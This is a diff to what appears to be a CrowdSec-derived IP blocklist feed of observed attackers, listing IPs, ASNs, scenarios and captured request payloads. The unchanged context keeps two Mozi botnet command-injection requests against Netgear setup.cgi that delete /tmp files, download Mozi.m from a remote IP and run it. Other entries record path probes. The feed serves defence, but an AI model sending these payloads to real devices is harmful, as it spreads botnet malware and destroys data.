@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-25T13:00:00Z",
+  "generated_at": "2026-10-26T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 49,
-    "v4": 49,
+    "total": 48,
+    "v4": 48,
     "v6": 0
   },
   "items": [
@@ -28,48 +28,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "40.124.180.6",
-      "family": "v4",
-      "first_seen": "2026-10-18T15:00:00Z",
-      "last_seen": "2026-10-18T15:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "40.124.0.0/16",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /actuator/health"
-      ]
-    },
-    {
-      "ip": "40.124.80.46",
-      "family": "v4",
-      "first_seen": "2026-10-18T14:00:00Z",
-      "last_seen": "2026-10-18T14:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "40.124.0.0/16",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /owa/auth/x.js"
       ]
     },
     {
@@ -1544,6 +1502,25 @@
       ],
       "payloads": [
         "GET /owa/auth/logon.aspx"
+      ]
+    },
+    {
+      "ip": "152.42.245.186",
+      "family": "v4",
+      "first_seen": "2026-10-25T23:00:00Z",
+      "last_seen": "2026-10-25T23:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "152.42.240.0/20",
+      "payloads": [
+        "GET /images/images/cache.php",
+        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
       ]
     }
   ]
